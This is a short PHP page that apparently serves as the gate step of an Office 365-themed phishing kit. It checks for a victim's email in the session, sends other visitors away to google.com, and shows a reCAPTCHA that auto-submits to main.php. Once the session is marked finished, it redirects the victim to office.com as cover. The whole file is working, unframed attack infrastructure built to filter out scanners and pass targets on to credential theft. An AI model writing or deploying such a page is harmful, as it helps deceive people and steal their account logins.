<?php
session_start();
if(isset($_SESSION['finished'])){
	header("location: https://www.office.com");
	}
if(isset($_SESSION['eml'])){
 ?>
<!doctype html>
<html lang="en">
  <head><meta http-equiv="Content-Type" content="text/html; charset=utf-8">
    
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <meta name="description" content="">

<link href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-ggOyR0iXCbMQv3Xipma34MD+dH/1fQ784/j6cY/iJTQUOhcWr7x9JvoRxT2MZw1T" crossorigin="anonymous">

<script src="https://www.google.com/recaptcha/api.js" async defer></script>

  </head>
  <body>
   <div class="container h-100 d-flex justify-content-center">
    <div class="my-auto">
      <form method="post" action="main.php" style="margin-top:45%" id="myForm">
	    <div class="g-recaptcha" data-callback="recaptchaCallback" data-sitekey="6LeGDLkfAAAAAFvNcNSW1-bOxgyQf3zbHpX9M3M8"></div>						  


		</form>
    </div>
</div>
</form>
<script>

function recaptchaCallback() {
document.getElementById("myForm").submit();
};
</script>
</body>
</html>
<?php } else {
	header("Location: https://www.google.com");
	} ?>
